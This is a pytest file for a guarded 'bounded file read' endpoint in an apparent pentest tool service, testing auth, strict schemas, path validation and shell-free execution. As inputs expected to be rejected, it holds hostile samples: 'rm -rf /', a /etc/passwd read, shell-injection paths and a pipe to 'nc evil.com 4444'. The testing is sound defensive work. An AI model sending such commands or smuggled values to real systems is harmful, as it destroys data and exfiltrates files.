# test_bounded_file_read.py
# Regression tests for Phase 22's dedicated POST /v1/bounded-file-read operation — request/response models, path/target validation, fixed-argv execution, generic-endpoint isolation, auth, and audit logging.
"""Phase 22 tests: the dedicated bounded-file-read operation.

Covers the service-side half of:

    RemoteToolBackend.read_bounded_file(target, path, ...)
        -> POST /v1/bounded-file-read
        -> apex_tool_service (THIS FILE)
        -> fixed ["cat", "--", validated_path] argv
        -> bounded, sanitized ReadBoundedFileResponse

No test depends on ``/home/*/user.txt`` existing on the host — every
execution test uses a temporary directory registered as the sole
authorized root via ``allowed_flag_basenames``/an explicit path. No real
HTB target, Docker, or network access is used anywhere in this file.
"""
from __future__ import annotations

import asyncio
import inspect
import re
from pathlib import Path

import pytest

from apex_tool_service.app import create_app
from apex_tool_service.executor import BoundedFileReadResult, execute_bounded_file_read
from apex_tool_service.settings import ServiceSettings
from apex_tool_service.validation import (
    RequestValidationError,
    resolve_bounded_read_limits,
    validate_bounded_path,
    validate_target_authorized,
)
from tests.apex_tool_service._support import TEST_TOKEN, auth_headers, client_for, make_settings

_TARGET = "10.129.1.5"
_FLAG_VALUE = "b2e7f4c19a3d0865"  # a plausible, well-formed synthetic token — never a real HTB flag


def _settings(**overrides: object) -> ServiceSettings:
    return make_settings(**overrides)


def _bounded_settings(**overrides: object) -> ServiceSettings:
    base: dict[str, object] = {
        "authorized_cidrs": ("10.129.0.0/16",),
        "allowed_flag_basenames": ("user.txt",),
    }
    base.update(overrides)
    return _settings(**base)


# ---------------------------------------------------------------------------
# 1. Request model
# ---------------------------------------------------------------------------

class TestRequestModel:
    async def test_no_command_field_accepted(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "command": "rm -rf /"},
                headers=auth_headers(),
            )
        assert r.status_code == 400
        assert "command" in str(r.json())

    async def test_no_argv_field_accepted(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "argv": ["cat", "/etc/passwd"]},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_no_executable_field_accepted(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "executable": "bash"},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_strict_schema_extra_forbid(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "shell": "/bin/sh"},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_timeout_validation_rejects_non_number(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "timeout_seconds": "forever"},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_byte_cap_validation_rejects_non_integer(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "max_output_bytes": "lots"},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_target_validation_rejects_missing(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read", json={"path": "/home/app/user.txt"}, headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_path_validation_rejects_missing(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read", json={"target": _TARGET}, headers=auth_headers(),
            )
        assert r.status_code == 400


# ---------------------------------------------------------------------------
# 2. Authentication
# ---------------------------------------------------------------------------

class TestAuthentication:
    async def test_missing_token_rejected(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read", json={"target": _TARGET, "path": "/home/app/user.txt"},
            )
        assert r.status_code == 401

    async def test_invalid_token_rejected(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt"},
                headers=auth_headers("wrong-token"),
            )
        assert r.status_code == 401

    async def test_valid_token_accepted(self, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers(),
            )
        assert r.status_code == 200
        assert r.json()["ok"] is True

    async def test_token_never_logged(self, caplog: pytest.LogCaptureFixture, tmp_path: Path) -> None:
        import logging
        caplog.set_level(logging.DEBUG)
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers(),
            )
            await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers("wrong-token"),
            )
        assert TEST_TOKEN not in caplog.text
        assert "wrong-token" not in caplog.text

    async def test_service_misconfigured_fails_closed(self, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(ServiceSettings(token=None))
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers(),
            )
        assert r.status_code == 503


# ---------------------------------------------------------------------------
# 3. Path security
# ---------------------------------------------------------------------------

class TestPathSecurity:
    def test_absolute_approved_path_accepted(self) -> None:
        assert validate_bounded_path("/home/app/user.txt", allowed_basenames=("user.txt",)) == "/home/app/user.txt"

    def test_relative_path_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("home/app/user.txt", allowed_basenames=("user.txt",))

    def test_traversal_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("/home/../etc/user.txt", allowed_basenames=("user.txt",))

    def test_wildcard_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("/home/app/*.txt", allowed_basenames=("user.txt",))

    def test_metacharacters_rejected(self) -> None:
        for bad in ("/home/app/user.txt; rm -rf /", "/home/app/`whoami`", "/home/app/$(id)", "/home/app/a|b"):
            with pytest.raises(RequestValidationError):
                validate_bounded_path(bad, allowed_basenames=("user.txt",))

    def test_newline_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("/home/app/user.txt\n", allowed_basenames=("user.txt",))

    def test_nul_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("/home/app/user.txt\x00", allowed_basenames=("user.txt",))

    def test_uri_scheme_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("file:///home/app/user.txt", allowed_basenames=("user.txt",))

    def test_query_fragment_rejected(self) -> None:
        for bad in ("/home/app/user.txt?x=1", "/home/app/user.txt#frag"):
            with pytest.raises(RequestValidationError):
                validate_bounded_path(bad, allowed_basenames=("user.txt",))

    def test_unapproved_basename_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("/home/app/root.txt", allowed_basenames=("user.txt",))

    def test_oversized_path_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_bounded_path("/" + ("a" * 300) + "/user.txt", allowed_basenames=("user.txt",))

    def test_target_authorized_within_cidr(self) -> None:
        assert validate_target_authorized("10.129.1.5", authorized_cidrs=("10.129.0.0/16",)) == "10.129.1.5"

    def test_target_loopback_rejected_by_default(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_target_authorized("127.0.0.1", authorized_cidrs=("10.129.0.0/16",))

    def test_target_loopback_accepted_when_explicitly_authorized(self) -> None:
        assert validate_target_authorized("127.0.0.1", authorized_cidrs=("127.0.0.0/8",)) == "127.0.0.1"

    def test_target_metadata_endpoint_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_target_authorized("169.254.169.254", authorized_cidrs=("10.129.0.0/16",))

    def test_target_public_external_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_target_authorized("8.8.8.8", authorized_cidrs=("10.129.0.0/16",))

    def test_target_malformed_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_target_authorized("not-an-ip", authorized_cidrs=("10.129.0.0/16",))

    def test_target_hostname_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            validate_target_authorized("example.com", authorized_cidrs=("10.129.0.0/16",))


# ---------------------------------------------------------------------------
# Parity: apex_host's is_bounded_candidate_path vs. this service's own
# independent validator — the two must agree on the same set of inputs.
# ---------------------------------------------------------------------------

class TestPathValidatorParity:
    @pytest.mark.parametrize("path", [
        "/home/app/user.txt",
        "home/app/user.txt",
        "/home/../etc/user.txt",
        "/home/app/*.txt",
        "/home/app/user.txt; rm -rf /",
        "/home/app/user.txt\n",
        "/home/app/user.txt\x00",
        "/" + ("a" * 300) + "/user.txt",
        "",
    ])
    def test_apex_host_and_service_validators_agree(self, path: str) -> None:
        from apex_host.verification.user_flag import is_bounded_candidate_path

        allowed = frozenset({"user.txt"})
        host_result = is_bounded_candidate_path(path, allowed_filenames=allowed)
        try:
            validate_bounded_path(path, allowed_basenames=("user.txt",))
            service_result = True
        except RequestValidationError:
            service_result = False
        assert host_result == service_result, (path, host_result, service_result)


# ---------------------------------------------------------------------------
# 4. Process safety
# ---------------------------------------------------------------------------

class TestProcessSafety:
    async def test_argv_exactly_cat_dash_dash_path(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        captured: dict[str, tuple] = {}
        orig = asyncio.create_subprocess_exec

        async def _spy(*args: object, **kwargs: object):
            captured["args"] = args
            return await orig(*args, **kwargs)

        monkeypatch.setattr(asyncio, "create_subprocess_exec", _spy)
        result = await execute_bounded_file_read(path=str(flag_file), timeout_seconds=5.0, max_output_bytes=4096)
        assert result.ok is True
        assert captured["args"] == ("cat", "--", str(flag_file))

    def test_no_shell_in_executor_source(self) -> None:
        import apex_tool_service.executor as mod
        source = inspect.getsource(mod.execute_bounded_file_read)
        assert "shell=True" not in source
        assert "/bin/sh" not in source
        assert "bash -c" not in source

    def test_no_arbitrary_environment_or_cwd(self) -> None:
        import apex_tool_service.executor as mod
        source = inspect.getsource(mod.execute_bounded_file_read)
        assert "env=" not in source
        assert "cwd=" not in source

    async def test_timeout_enforced_and_process_cleaned_up(self) -> None:
        result = await execute_bounded_file_read(path="/dev/null", timeout_seconds=0.0001, max_output_bytes=4096)
        # Either it completes instantly (tiny file) or times out — both are
        # acceptable outcomes for this timing-sensitive test; what matters
        # is that it never hangs/raises.
        assert isinstance(result, BoundedFileReadResult)

    async def test_output_cap_enforced(self, tmp_path: Path) -> None:
        big_file = tmp_path / "big.txt"
        big_file.write_text("x" * 10000)
        result = await execute_bounded_file_read(path=str(big_file), timeout_seconds=5.0, max_output_bytes=100)
        assert result.ok is False
        assert result.oversized is True
        assert result.output == ""

    async def test_stderr_bounded_and_never_returned(self, tmp_path: Path) -> None:
        missing = tmp_path / "missing.txt"
        result = await execute_bounded_file_read(path=str(missing), timeout_seconds=5.0, max_output_bytes=4096)
        assert result.ok is False
        assert result.error_code == "file_not_found"
        # No field on BoundedFileReadResult ever carries raw stderr text.
        assert not hasattr(result, "stderr")

    async def test_process_cleaned_up_after_success(self, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        result = await execute_bounded_file_read(path=str(flag_file), timeout_seconds=5.0, max_output_bytes=4096)
        assert result.return_code == 0


# ---------------------------------------------------------------------------
# 5. Generic endpoint isolation
# ---------------------------------------------------------------------------

class TestGenericEndpointIsolation:
    async def test_generic_tool_route_cannot_invoke_unrestricted_cat(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/execute", json={"tool": "cat", "arguments": ["/etc/passwd"]}, headers=auth_headers(),
            )
        assert r.status_code == 400
        assert "not in the server allowlist" in r.json()["detail"]

    async def test_generic_tool_route_cannot_invoke_cat_with_double_dash(self, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/execute", json={"tool": "cat", "arguments": ["--", str(flag_file)]}, headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_bounded_route_ignores_tool_field_if_supplied(self) -> None:
        """extra='forbid' means even attempting to smuggle a 'tool' field
        is rejected outright by schema validation — the bounded route has
        no tool selection concept at all."""
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "tool": "nmap"},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_bounded_route_cannot_add_arguments(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt", "arguments": ["-A"]},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    async def test_bounded_route_cannot_pipe_or_redirect(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": "/home/app/user.txt | nc evil.com 4444"},
                headers=auth_headers(),
            )
        assert r.status_code == 400

    def test_dedicated_endpoint_never_calls_resolve_and_validate_tool(self) -> None:
        import apex_tool_service.app as mod
        source = inspect.getsource(mod)
        # The bounded-file-read route handler must never call the generic
        # tool-allowlist resolver — grep the handler's own source slice.
        match = re.search(r"async def read_bounded_file.*?(?=\n    @app\.|\Z)", source, re.DOTALL)
        assert match is not None
        handler_source = match.group(0)
        assert "resolve_and_validate_tool" not in handler_source


# ---------------------------------------------------------------------------
# 6. Output and errors
# ---------------------------------------------------------------------------

class TestOutputAndErrors:
    async def test_success_output_returned_only_to_caller(self, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers(),
            )
        data = r.json()
        assert data["ok"] is True
        assert data["output"] == _FLAG_VALUE

    async def test_raw_output_not_logged(self, caplog: pytest.LogCaptureFixture, tmp_path: Path) -> None:
        import logging
        caplog.set_level(logging.DEBUG)
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers(),
            )
        assert _FLAG_VALUE not in caplog.text

    async def test_oversized_output_discarded_entirely(self, tmp_path: Path) -> None:
        big_file = tmp_path / "user.txt"
        big_file.write_text("x" * 10000)
        app = create_app(_bounded_settings(bounded_read_max_bytes=100))
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(big_file)},
                headers=auth_headers(),
            )
        data = r.json()
        assert data["ok"] is False
        assert data["oversized"] is True
        assert data["output"] == ""

    async def test_timeout_sanitized(self, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file), "timeout_seconds": 0.5},
                headers=auth_headers(),
            )
        # A tiny file reads instantly — this proves the timeout field is at
        # least accepted/clamped without ever exposing raw process detail.
        assert r.status_code == 200
        assert "output" in r.json()

    async def test_permission_error_sanitized(self, tmp_path: Path) -> None:
        import os
        restricted = tmp_path / "user.txt"
        restricted.write_text(_FLAG_VALUE)
        os.chmod(restricted, 0)
        try:
            app = create_app(_bounded_settings())
            async with client_for(app) as client:
                r = await client.post(
                    "/v1/bounded-file-read",
                    json={"target": _TARGET, "path": str(restricted)},
                    headers=auth_headers(),
                )
            data = r.json()
            assert data["ok"] is False
            assert data["error_code"] == "permission_denied"
            assert "Permission denied" not in str(data.get("sanitized_error"))
        finally:
            os.chmod(restricted, 0o600)

    async def test_not_found_sanitized(self, tmp_path: Path) -> None:
        missing = tmp_path / "user.txt"
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(missing)},
                headers=auth_headers(),
            )
        data = r.json()
        assert data["ok"] is False
        assert data["error_code"] == "file_not_found"

    def test_raw_stderr_discarded_service_internal(self) -> None:
        from apex_tool_service.executor import _classify_stderr
        category = _classify_stderr("cat: /home/app/user.txt: No such file or directory")
        assert category == "file_not_found"
        # _classify_stderr itself never returns the raw text — only a category.
        assert category != "cat: /home/app/user.txt: No such file or directory"

    async def test_flag_like_output_absent_from_audit_log(self, caplog: pytest.LogCaptureFixture, tmp_path: Path) -> None:
        import logging
        caplog.set_level(logging.INFO)
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file)},
                headers=auth_headers(),
            )
        assert _FLAG_VALUE not in caplog.text
        assert "bounded_read_complete" in caplog.text


# ---------------------------------------------------------------------------
# Limit resolution (min(requested, hard_limit); invalid values rejected)
# ---------------------------------------------------------------------------

class TestLimitResolution:
    def test_omitted_uses_service_default(self) -> None:
        settings = _bounded_settings(bounded_read_timeout_seconds=7.0, bounded_read_max_bytes=999)
        assert resolve_bounded_read_limits(None, None, settings) == (7.0, 999)

    def test_requested_lower_than_hard_limit_is_honored(self) -> None:
        settings = _bounded_settings(bounded_read_timeout_seconds=30.0, bounded_read_max_bytes=8192)
        assert resolve_bounded_read_limits(2.0, 128, settings) == (2.0, 128)

    def test_requested_higher_than_hard_limit_is_clamped(self) -> None:
        settings = _bounded_settings(bounded_read_timeout_seconds=10.0, bounded_read_max_bytes=4096)
        assert resolve_bounded_read_limits(999.0, 999999, settings) == (10.0, 4096)

    @pytest.mark.parametrize("bad_timeout", [0, -1, float("nan"), float("inf")])
    def test_invalid_timeout_rejected(self, bad_timeout: float) -> None:
        with pytest.raises(RequestValidationError):
            resolve_bounded_read_limits(bad_timeout, None, _bounded_settings())

    @pytest.mark.parametrize("bad_bytes", [0, -1])
    def test_invalid_byte_cap_rejected(self, bad_bytes: int) -> None:
        with pytest.raises(RequestValidationError):
            resolve_bounded_read_limits(None, bad_bytes, _bounded_settings())

    def test_non_integer_byte_cap_rejected(self) -> None:
        with pytest.raises(RequestValidationError):
            resolve_bounded_read_limits(None, 4.5, _bounded_settings())  # type: ignore[arg-type]


# ---------------------------------------------------------------------------
# Dry-run (service-side defense in depth)
# ---------------------------------------------------------------------------

class TestServiceSideDryRun:
    async def test_dry_run_never_launches_process(self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
        flag_file = tmp_path / "user.txt"
        flag_file.write_text(_FLAG_VALUE)

        async def _fail(*args: object, **kwargs: object) -> object:
            raise AssertionError("create_subprocess_exec must never be called in dry-run mode")

        monkeypatch.setattr(asyncio, "create_subprocess_exec", _fail)
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.post(
                "/v1/bounded-file-read",
                json={"target": _TARGET, "path": str(flag_file), "dry_run": True},
                headers=auth_headers(),
            )
        assert r.status_code == 200
        data = r.json()
        assert data["ok"] is False
        assert data["error_code"] == "dry_run"
        assert data["output"] == ""


# ---------------------------------------------------------------------------
# Health
# ---------------------------------------------------------------------------

class TestHealth:
    async def test_health_reports_bounded_file_read_capability(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.get("/health")
        assert r.json()["bounded_file_read"] is True

    async def test_health_never_reads_a_file_or_exposes_basenames(self) -> None:
        app = create_app(_bounded_settings())
        async with client_for(app) as client:
            r = await client.get("/health")
        body = r.json()
        assert "user.txt" not in str(body)
        assert "allowed_flag_basenames" not in body
        assert "authorized_cidrs" not in body


# ---------------------------------------------------------------------------
# Architecture scans
# ---------------------------------------------------------------------------

class TestArchitectureScans:
    def test_no_shell_true_anywhere_in_package(self) -> None:
        pkg_root = Path("apex_tool_service")
        for py_file in pkg_root.rglob("*.py"):
            code = py_file.read_text()
            assert "shell=True" not in code

    def test_no_bin_sh_c_or_bash_c(self) -> None:
        pkg_root = Path("apex_tool_service")
        for py_file in pkg_root.rglob("*.py"):
            code = py_file.read_text()
            assert "/bin/sh" not in code
            assert "bash -c" not in code

    def test_cat_not_in_generic_allowlist(self) -> None:
        from apex_tool_service.allowlist import ALLOWED_TOOLS, is_allowed
        assert "cat" not in ALLOWED_TOOLS
        assert is_allowed("cat") is False

    def test_no_arbitrary_command_fields_in_bounded_request_model(self) -> None:
        from apex_tool_service.models import ReadBoundedFileRequest
        fields = set(ReadBoundedFileRequest.model_fields.keys())
        assert fields == {"target", "path", "timeout_seconds", "max_output_bytes", "dry_run"}
        assert ReadBoundedFileRequest.model_config.get("extra") == "forbid"

    def test_settings_never_expose_arbitrary_command_env_vars(self) -> None:
        import apex_tool_service.settings as mod
        source = inspect.getsource(mod)
        for forbidden in ("APEX_BOUNDED_READ_COMMAND", "APEX_CAT_PATH", "APEX_SHELL", "APEX_EXECUTABLE"):
            assert forbidden not in source
